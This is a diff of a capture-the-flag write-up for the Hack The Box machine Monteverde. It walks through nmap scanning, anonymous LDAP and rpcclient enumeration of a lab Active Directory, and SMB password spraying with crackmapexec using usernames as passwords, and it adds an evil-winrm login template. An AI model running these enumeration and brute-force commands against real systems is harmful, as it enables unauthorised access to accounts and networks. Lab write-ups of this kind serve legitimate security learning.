@@ -6,40 +6,59 @@
 
 &lt;Short description to include any strange things to be dealt with&gt; 
 
-Useful Skills and Tools
+## Useful Skills and Tools
 
-#### &lt;Useful thing 1&gt;
+#### Using ldapsearch to enumerate a Windows domain
 
-&lt;description with generic example&gt;
+`ldapsearch -H ldap://<ip>:<port> -x -LLL -s sub -b "DC=<domain>,DC=local"`
 
-#### &lt;Useful thing 2&gt;
+#### Enumerating users on a Windows domain with rpcclient \(without credentials\)
 
-&lt;description with generic example&gt;
+> rpcclient -U "" -N &lt;ip&gt;
+>
+> * rpcclient $&gt; enumdomusers
+> * rpcclient $&gt; queryuser &lt;user\_RID&gt;
+> * rpcclient $&gt; enumalsgroups builtin
+> * rpcclient $&gt; queryaliasmem builtin &lt;RID&gt;
+>
+>           sid:\[S-1-5-21-391775091-850290835-3566037492-1601\]
+>
+> * rpcclient $&gt; queryuser 1601
 
 #### Bruteforcing SMB login with only usernames
 
 `crackmapexec smb 10.10.10.172 -u users.txt -p users.txt`
 
+#### Connect to a Windows Server through Windows Remote Management \(WinRM\)
+
+`evil-winrm -i <ip> -u <username> -p '<password>'`
+
+#### Useful Windows groups
+
+* Remote Management Users
+* Azure Admins
+
+#### 
+
 ## Enumeration
 
 ### Nmap scan
 
-Initial attempt at nmap scan failed
+Like always, I started my enumeration with an nmap scan of `10.10.10.172`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` runs a TCP connect scan, `-sV` does a service scan, and `-oN <name>` saves the nmap output with a filename of `<name>`.
 
 ```text
-zweilos@kalimaa:~/htb/monteverde$ nmap -sC -sV -oA monteverde 10.10.10.172
+zweilos@kalimaa:~/htb/monteverde$ nmap -p- -sC -sV -oN monteverde.nmap 10.10.10.172
+
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-24 10:42 EDT
 Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
-
-Nmap done: 1 IP address (0 hosts up) scanned in 3.27 seconds
 ```
 
-adding `-Pn` fixed \(like on htb:nest\)
+At first my scan wouldn't go through until I added the `-Pn` flag to stop nmap from sending ICMP probes. After that it proceeded normally.  This behavior seems to be more common on Windows machines, as I also encountered this on `Nest` and `Oouch`. 
 
 ```text
-zweilos@kalimaa:~/htb/monteverde$ nmap -p- -sC -sV -Pn -oA monteverde-full -vvv 10.10.10.172
+zweilos@kalimaa:~/htb/monteverde$ nmap -p- -sC -sV -Pn -oN monteverde.nmap 10.10.10.172
 
-# Nmap 7.80 scan initiated Thu May 28 13:42:58 2020 as: nmap -p- -sC -sV -Pn -oA monteverde-full -vvv 10.10.10.172
+# Nmap 7.80 scan initiated Thu May 28 13:42:58 2020 as: nmap -p- -sC -sV -Pn -oN monteverde-full 10.10.10.172
 Nmap scan report for 10.10.10.172
 Host is up, received user-set (0.14s latency).
 Scanned at 2020-05-28 13:43:03 EDT for 733s
@@ -98,9 +117,14 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Thu May 28 13:55:16 2020 -- 1 IP address (1 host up) scanned in 738.00 seconds
 ```
 
+From these results we can see there are a lot of ports open! Since ports `88 - kerberos`, `135 & 139 - Remote Procedure Call`, `389 & 3268 - LDAP`, and `445 - SMB` are all open it is safe to assume that this box is running Active Directory on a Windows machine. 
+
+### ldapsearch
+
+Since I had so many options, I decided to start by enumerating Active Directory through LDAP using `ldapsearch`. This command is built into many linux distros and returned a wealth of information. I snipped out huge chunks of the output in order to reduce information overload as most of it was not particularly interesting in this case.
+
 ```text
 zweilos@kalimaa:~/htb/monteverde$ ldapsearch -H ldap://10.10.10.172:3268 -x -LLL -s base -b "DC=megabank,DC=local"
-dn: DC=megabank,DC=local
 
 ...snipped for brevity...
 
@@ -185,7 +209,11 @@ groupType: -2147483646
 objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
 dSCorePropagationData: 20200103123551.0Z
 dSCorePropagationData: 16010101000001.0Z
+```
 
+The user `mhope` seems like a good target.  He is a member of both the `Remote Management Users` and `Azure Admins` groups, which should be good for getting into the machine and escalating our privileges.
+
+```text
 dn: CN=SABatchJobs,OU=Service Accounts,DC=MEGABANK,DC=LOCAL
 objectClass: top
 objectClass: person
@@ -291,62 +319,7 @@ objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
 dSCorePropagationData: 20200103130142.0Z
 dSCorePropagationData: 16010101000000.0Z
 
-dn: CN=File Server Admins,OU=Groups,DC=MEGABANK,DC=LOCAL
-objectClass: top
-objectClass: group
-cn: File Server Admins
-distinguishedName: CN=File Server Admins,OU=Groups,DC=MEGABANK,DC=LOCAL
-instanceType: 4
-whenCreated: 20200103130214.0Z
-whenChanged: 20200103130214.0Z
-uSNCreated: 41118
-uSNChanged: 41118
-name: File Server Admins
-objectGUID:: XbIZFB31iUu+oE5hb0Gflw==
-objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3ULgoAAA==
-sAMAccountName: File Server Admins
-sAMAccountType: 268435456
-groupType: -2147483646
-objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
-dSCorePropagationData: 16010101000000.0Z
-
-dn: CN=Call Recording Admins,OU=Groups,DC=MEGABANK,DC=LOCAL
-objectClass: top
-objectClass: group
-cn: Call Recording Admins
-distinguishedName: CN=Call Recording Admins,OU=Groups,DC=MEGABANK,DC=LOCAL
-instanceType: 4
-whenCreated: 20200103130230.0Z
-whenChanged: 20200103130230.0Z
-uSNCreated: 41122
-uSNChanged: 41122
-name: Call Recording Admins
-objectGUID:: rM9iiw6U/UitOcZPMeyo/g==
-objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3ULwoAAA==
-sAMAccountName: Call Recording Admins
-sAMAccountType: 268435456
-groupType: -2147483646
-objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
-dSCorePropagationData: 16010101000000.0Z
-
-dn: CN=Reception,OU=Groups,DC=MEGABANK,DC=LOCAL
-objectClass: top
-objectClass: group
-cn: Reception
-distinguishedName: CN=Reception,OU=Groups,DC=MEGABANK,DC=LOCAL
-instanceType: 4
-whenCreated: 20200103130247.0Z
-whenChanged: 20200103130247.0Z
-uSNCreated: 41126
-uSNChanged: 41126
-name: Reception
-objectGUID:: ZiAJfn6gPEey3sgb7mBWkQ==
-objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3UMAoAAA==
-sAMAccountName: Reception
-sAMAccountType: 268435456
-groupType: -2147483646
-objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
-dSCorePropagationData: 16010101000000.0Z
+...
 
 dn: CN=Operations,OU=Groups,DC=MEGABANK,DC=LOCAL
 objectClass: top
@@ -408,24 +381,7 @@ groupType: -2147483646
 objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
 dSCorePropagationData: 16010101000000.0Z
 
-dn: CN=Developers,OU=Groups,DC=MEGABANK,DC=LOCAL
-objectClass: top
-objectClass: group
-cn: Developers
-distinguishedName: CN=Developers,OU=Groups,DC=MEGABANK,DC=LOCAL
-instanceType: 4
-whenCreated: 20200103130340.0Z
-whenChanged: 20200103130340.0Z
-uSNCreated: 41142
-uSNChanged: 41142
-name: Developers
-objectGUID:: +fTskeAElUaRwaJvDjbehQ==
-objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3UNAoAAA==
-sAMAccountName: Developers
-sAMAccountType: 268435456
-groupType: -2147483646
-objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
-dSCorePropagationData: 16010101000000.0Z
+...
 
 dn: CN=Dimitris Galanos,OU=Athens,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL
 objectClass: top
@@ -515,10 +471,13 @@ dSCorePropagationData: 20200103130921.0Z
 dSCorePropagationData: 16010101000000.0Z
 ```
 
-ldap returns a vast wealth of information, user list verification done :
+### rpcclient
+
+Next I used `rpcclient` to validate the information I found through LDAP using the `enumdomusers` , `queryuser <RID or last 4 of SID>` , `enumalsgroups builtin` , and `queryaliasmem builtin <RID>`RPC commands.
 
 ```text
 zweilos@kalimaa:~/htb/monteverde$ rpcclient -U "" -N 10.10.10.172
+
 rpcclient $> enumdomusers
 user:[Guest] rid:[0x1f5]
 user:[AAD_987d7f2f57d2] rid:[0x450]
@@ -587,19 +546,26 @@ rpcclient $> queryuser 1601
         logon_hrs[0..21]...
 ```
 
-I was not able to log in as `mhope` without a password, however...possible users found:
+### Interesting users/groups found
+
+There was no interesting information in the other users other than the business divisions they worked in, but I made a list of their usernames, just in case. So far the users and groups I found were:
 
 * AAD\_987d7f2f57d2
+  * a member of the `Azure Admins` group
 * mhope
+  * a member of both the `Remote Management Users` and the `Azure Admins` group.
 * SABatchJobs
 * svc-ata
 * svc-bexec
 * svc-netapp
 * dgalanos
+  * a member of the `Trading` group
 * roleary
+  * a member of the `HelpDesk` group
 * smorgan
+  * a member the `Operations` group
 
-...had to figure out which user was correct, no password found, created a username list and used it as both user/pass in crackmapexec until one worked...username was same as pw for SABatchJobs
+not able to login as mhope without a password...had to figure out which user was correct, no password found, created a username list and used it as both user/pass in crackmapexec until one worked...username was same as pw for SABatchJobs
 
 ```text
 zweilos@kalimaa:~/htb/monteverde$ crackmapexec smb 10.10.10.172 -u users.txt -p users.txt
